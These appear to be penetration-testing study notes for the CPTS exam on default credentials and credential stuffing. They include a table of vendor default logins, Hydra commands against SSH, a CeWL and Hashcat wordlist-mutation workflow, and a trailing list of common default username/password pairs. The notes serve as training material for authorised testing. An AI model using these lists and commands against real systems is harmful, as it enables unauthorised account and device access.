🔓 Section Breakdown: Password Reuse / Default Credentials
🧠 Why This Happens in the Real World
Admins juggle way too many systems. So they:

Use default creds for install setups.

Reuse the same password across apps or devices.

Assume internal = safe, so they get lazy.

Single-Sign-On (SSO) isn’t always ready, especially early in infra builds, so creds get manually slapped on a bunch of things.

Internal systems, test environments, and old boxes = prime targets for unchanged default logins.

📚 Default Credentials Goldmine
A lot of services and appliances come with hardcoded login defaults, like:

Product	Username	Password
Zyxel	zyfwp	PrOw!aN_fXp
Weblogic	weblogic	welcome(1)
Dlink	root	root
Kanboard	admin	admin
Kali Linux	kali	kali
F5	root	default
✅ Cheat sheet location:

DefaultCreds-Cheat-Sheet

🛠️ Credential Stuffing = Brute Force 2.0
Credential stuffing = using known username:password combos in bulk to authenticate.

Think of it like "smart brute force" — no guessing character-by-character, just loading up realistic creds and seeing what sticks.

🔧 Hydra Syntax:
bash
Copy
Edit
hydra -C user_pass.list ssh://<target-IP>
✅ user_pass.list format:

makefile
Copy
Edit
admin:admin
weblogic:welcome1
root:toor
🧠 Why This Works
Even when password policies exist, humans still:

Use months + years (e.g. May2024!)

Tweak base words (Company2024!)

Follow "memorable but lazy" formulas

So when you take default creds and mutate them with rules or context from OSINT, your hit rate jumps through the roof.

🔍 OSINT-Boosted Attacks
Recon the company site or GitHub:

Look for dev names, pet projects, product names, tools used.

Use CeWL to scrape the site and mutate it into a wordlist:

bash
Copy
Edit
cewl https://targetsite.com -d 3 -m 5 --lowercase -w base.txt
Combine with custom rules in Hashcat:

bash
Copy
Edit
hashcat -r /usr/share/hashcat/rules/best64.rule base.txt --stdout > strong_mutated.txt
Feed into Hydra:

bash
Copy
Edit
hydra -L users.txt -P strong_mutated.txt ssh://<target>
💻 Router Defaults Still Worth Testing
Even if it’s rare, some routers or embedded devices:

Ship with unchangeable defaults

Are installed internally and forgotten

Can be escalated through if breached

Check Router Passwords or Default Password DB for good lists.

💡 Real Talk – CPTS Relevance
Credential stuffing is likely to be a fast-track path to initial access in an enterprise-style CPTS box.

Combine:

Hydra

DefaultCreds lists

Password mutation rules

OSINT-based keyword lists

And don’t forget: if FTP or RDP is open, check for reused creds across other services (like SSH or WinRM).


    ("admin", "admin"),
    ("root", "root"),
    ("admin", "password"),
    ("user", "user"),
    ("administrator", "admin"),
    ("guest", "guest"),
    ("admin", "1234"),
    ("root", "toor"),
    ("ftp", "ftp"),
    ("test", "test"),
    ("weblogic", "weblogic"),
    ("admin", "12345"),
    ("root", "12345"),
    ("cisco", "cisco"),
    ("admin", "default"),
    ("support", "support"),
    ("admin", "changeme"),
    ("ubnt", "ubnt"),
    ("pi", "raspberry"),
    ("oracle", "oracle"),
    ("postgres", "postgres"),
    ("tomcat", "tomcat"),
    ("admin", "tomcat"),
    ("admin", "P@ssw0rd"),
    ("admin", "admin123"),
    ("admin", "Admin123"),
    ("admin", "123456"),
    ("admin", "letmein"),
    ("admin", "welcome"),
    ("admin", "abc123"),
    ("admin", "qwerty"),
    ("admin", "1q2w3e4r"),
    ("admin", "passw0rd"),
    ("admin", "superuser"),
    ("admin", "manager"),
    ("netman", "netman"),
    ("monitor", "monitor"),
    ("webadmin", "webadmin"),
    ("guest", "1234"),
]
